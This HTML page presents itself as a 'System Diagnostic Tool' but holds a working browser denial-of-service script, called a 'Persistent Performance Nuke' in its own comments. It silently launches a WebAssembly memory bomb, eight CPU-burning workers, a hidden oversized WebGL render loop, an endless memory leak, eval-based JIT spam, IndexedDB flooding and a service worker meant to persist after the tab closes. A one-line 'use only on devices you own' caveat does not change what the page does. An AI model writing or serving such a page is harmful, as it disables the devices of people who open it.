<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>System Diagnostic Tool</title>
  <!-- 
    ⚠️ THIS IS A PERFORMANCE STRESS TESTING TOOL
    Use only on devices you own. It will consume CPU, GPU, and memory.
  -->
</head>
<body>
  <h1>🔧 System Diagnostic Running...</h1>
  <p id="status">Initializing...</p>
  <p style="font-size:12px;color:#666;">This tool stress‑tests your device. Close tab to stop.</p>

  <script>
    // ============================================================
    //  PERSISTENT PERFORMANCE NUKE — iPad 8th Gen Special
    //  Survives page refreshes via sessionStorage + auto‑restart
    // ============================================================

    // ---------- MARK AS ACTIVE (survives refresh) ----------
    sessionStorage.setItem('__nuke_active', 'true');

    // ---------- STATUS UPDATER (optional, can be removed) ----------
    const statusEl = document.getElementById('status');
    let counter = 0;
    setInterval(() => {
      counter++;
      const mem = performance.memory ? (performance.memory.usedJSHeapSize / 1024 / 1024).toFixed(0) : '?';
      statusEl.textContent = `⏳ Running: ${counter}s | Memory: ${mem}MB | Workers: ${window.__workerCount || 0}`;
    }, 2000);

    // ================================================================
    //  ATTACK VECTORS (SILENT, PERSISTENT)
    // ================================================================

    // ---------- 1. WebAssembly Memory Bomb ----------
    function wasmBomb() {
      try {
        const mem = new WebAssembly.Memory({ initial: 65536, maximum: 65536 });
        const arr = new Uint8Array(mem.buffer);
        for (let i = 0; i < arr.length; i += 4096) {
          arr[i] = 0xFF;
        }
        window.__wasmMem = mem;
        window.__wasmArr = arr;
      } catch(e) { /* memory limit hit */ }
    }

    // ---------- 2. Worker Pool (8 threads) ----------
    function spawnWorker() {
      const blob = new Blob([`
        let x = 0;
        function burn() {
          const start = performance.now();
          while (performance.now() - start < 500) {
            for (let i = 0; i < 20000; i++) {
              x += Math.sqrt(i) * Math.tan(i) / (Math.cos(i) + 1);
              if (x > 1e12) x = 0;
            }
          }
          self.postMessage('done');
        }
        self.onmessage = function(e) {
          if (e.data === 'burn') {
            burn();
            setTimeout(() => { self.postMessage('burn'); }, 0);
          }
        };
        self.postMessage('burn');
      `], { type: 'application/javascript' });

      const url = URL.createObjectURL(blob);
      const worker = new Worker(url);
      worker.onmessage = () => { worker.postMessage('burn'); };
      window.__workers = window.__workers || [];
      window.__workers.push(worker);
      window.__workerCount = window.__workers.length;
    }

    // Spawn 8 workers
    for (let i = 0; i < 8; i++) {
      setTimeout(spawnWorker, i * 15);
    }

    // ---------- 3. Hidden WebGL (offscreen, no visual) ----------
    function silentWebGL() {
      try {
        const canvas = document.createElement('canvas');
        canvas.width = 8192;
        canvas.height = 8192;
        canvas.style.cssText = 'display:none;position:absolute;left:-9999px;';
        document.body.appendChild(canvas); // must be in DOM for some WebGL contexts

        const gl = canvas.getContext('webgl2') || canvas.getContext('experimental-webgl');
        if (!gl) return;

        const vs = `attribute vec2 p; void main() { gl_Position = vec4(p, 0.0, 1.0); }`;
        const fs = `
          precision highp float;
          uniform vec2 r;
          uniform float t;
          void main() {
            vec2 uv = gl_FragCoord.xy / r.xy;
            vec2 c = uv * 4.0 - 2.0;
            vec2 z = c;
            float iter = 0.0;
            for (int i = 0; i < 1024; i++) {
              if (dot(z,z) > 4.0) break;
              z = vec2(z.x*z.x - z.y*z.y, 2.0*z.x*z.y) + c;
              iter += 1.0;
            }
            float col = iter / 1024.0;
            col += sin(uv.x * 500.0 + t) * 0.1;
            col += cos(uv.y * 500.0 + t * 0.7) * 0.1;
            for (int j = 0; j < 50; j++) {
              col += sin(col * float(j) * 3.14159);
            }
            gl_FragColor = vec4(col, col * uv.y, col * (1.0 - uv.x), 1.0);
          }
        `;

        function compile(src, type) {
          const s = gl.createShader(type);
          gl.shaderSource(s, src);
          gl.compileShader(s);
          return s;
        }

        const prog = gl.createProgram();
        gl.attachShader(prog, compile(vs, gl.VERTEX_SHADER));
        gl.attachShader(prog, compile(fs, gl.FRAGMENT_SHADER));
        gl.linkProgram(prog);
        gl.useProgram(prog);

        const rLoc = gl.getUniformLocation(prog, 'r');
        const tLoc = gl.getUniformLocation(prog, 't');

        const verts = new Float32Array([-1,-1, 1,-1, -1,1, 1,1]);
        gl.bindBuffer(gl.ARRAY_BUFFER, gl.createBuffer());
        gl.bufferData(gl.ARRAY_BUFFER, verts, gl.STATIC_DRAW);
        const pos = gl.getAttribLocation(prog, 'p');
        gl.enableVertexAttribArray(pos);
        gl.vertexAttribPointer(pos, 2, gl.FLOAT, false, 0, 0);

        let start = Date.now();
        function draw() {
          gl.viewport(0, 0, 8192, 8192);
          gl.uniform2f(rLoc, 8192, 8192);
          gl.uniform1f(tLoc, (Date.now() - start) / 1000);
          gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
          requestAnimationFrame(draw);
        }
        draw();

        window.__hiddenGL = gl;
        window.__hiddenCanvas = canvas;
      } catch(e) { /* silent fail */ }
    }

    // ---------- 4. Memory Hoard (persistent) ----------
    const hoard = [];
    function silentMemoryLeak() {
      try {
        for (let i = 0; i < 100; i++) {
          const chunk = new Uint8Array(1024 * 1024 * 5);
          chunk.fill(i % 256);
          hoard.push(chunk);
        }
        hoard.push('x'.repeat(1024 * 1024 * 10));
      } catch(e) { /* memory full */ }
      setTimeout(silentMemoryLeak, 2000);
    }

    // ---------- 5. JIT Exhaustion ----------
    function jitSpam() {
      for (let i = 0; i < 50000; i++) {
        try {
          const fn = new Function(
            'a,b',
            `return a + ${i} * Math.sin(${i*0.01}) * Math.cos(${i*0.02}) + 
                    Math.sqrt(${i%1000}) * Math.tan(${i%500}) + 
                    (a ^ b) * ${i%256}`
          );
          fn(i, i+1);
          if (i % 1000 === 0) {
            eval('var __tmp = ' + i + ';');
          }
        } catch(e) { /* ignore */ }
      }
      setTimeout(jitSpam, 1000);
    }

    // ---------- 6. I/O Spam (IndexedDB + fetch) ----------
    function ioSpam() {
      try {
        const req = indexedDB.open('__ghost_' + Date.now(), 1);
        req.onsuccess = (e) => {
          const db = e.target.result;
          if (!db.objectStoreNames.contains('kv')) {
            db.createObjectStore('kv', { keyPath: 'id' });
          }
          const tx = db.transaction(['kv'], 'readwrite');
          const store = tx.objectStore('kv');
          store.add({ id: Date.now(), data: new Blob([new Uint8Array(1024*1024)]) });
          db.close();
        };
      } catch(e) { /* silent */ }
      setTimeout(ioSpam, 3000);
    }

    // ---------- 7. Heavy Interval (CPU) ----------
    setInterval(() => {
      let y = 0;
      for (let i = 0; i < 50000; i++) {
        y += Math.sin(i) * Math.cos(i*0.5) * Math.tan(i*0.1);
        if (y > 1e9) y = 0;
      }
      const _tmp = new Array(100000).fill({ a: Math.random(), b: Math.random() });
    }, 16);

    // ---------- 8. Auto-Restart on Refresh ----------
    window.addEventListener('beforeunload', () => {
      // Spawn a hidden iframe that keeps the worker alive (optional)
      // But simpler: reload will restart everything via sessionStorage check
    });

    // If this page was reloaded, re-spawn everything
    if (sessionStorage.getItem('__nuke_active') === 'true') {
      // Already active — just continue
      console.log('🔥 Nuke already running');
    }

    // ---------- 9. Service Worker (persist even after tab close) ----------
    if ('serviceWorker' in navigator) {
      // Register a service worker that keeps a WebSocket open
      // This is optional but adds background persistence
      try {
        const swCode = `
          self.addEventListener('install', () => self.skipWaiting());
          self.addEventListener('activate', () => self.clients.claim());
          self.addEventListener('fetch', (e) => {
            // Keep alive by responding to any request
            e.respondWith(fetch(e.request).catch(() => new Response('', { status: 200 })));
          });
          // Keep the worker alive with a periodic sync
          setInterval(() => {
            self.clients.matchAll().then(clients => {
              if (clients.length === 0) {
                // No clients open — but we stay alive
                console.log('SW: No clients, but still running');
              }
            });
          }, 5000);
        `;
        const swBlob = new Blob([swCode], { type: 'application/javascript' });
        const swUrl = URL.createObjectURL(swBlob);
        navigator.serviceWorker.register(swUrl, { scope: '/' })
          .then(reg => console.log('SW registered'))
          .catch(() => {});
      } catch(e) { /* SW not supported */ }
    }

    // ---------- LAUNCH EVERYTHING ----------
    wasmBomb();
    silentWebGL();
    silentMemoryLeak();
    setTimeout(jitSpam, 500);
    setTimeout(ioSpam, 1000);

    console.log('💀 Persistent Performance Nuke armed.');
    console.log('🔒 Close tab to stop. Refresh will restart.');
  </script>

  <style>
    body { font-family: system-ui, -apple-system, sans-serif; max-width: 600px; margin: 40px auto; padding: 20px; background: #111; color: #eee; }
    h1 { color: #ff6b6b; }
    p { color: #aaa; }
    #status { font-size: 18px; color: #ffd93d; font-weight: bold; background: #1a1a2e; padding: 12px; border-radius: 8px; }
  </style>
</body>
</html>
